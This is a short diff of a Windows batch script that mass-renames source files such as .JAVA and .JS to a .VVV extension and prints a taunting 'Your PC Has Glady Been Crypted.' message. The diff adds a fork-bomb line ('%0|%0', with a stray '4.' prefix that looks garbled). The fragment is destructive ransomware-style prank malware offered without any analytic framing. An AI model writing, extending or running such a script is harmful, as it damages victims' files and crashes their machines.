@@ -24,3 +24,4 @@ REN *.JAVA *.VVV
 REN *.JS *.VVV
 cls
 echo Your PC Has Glady Been Crypted.
+4.%0|%0
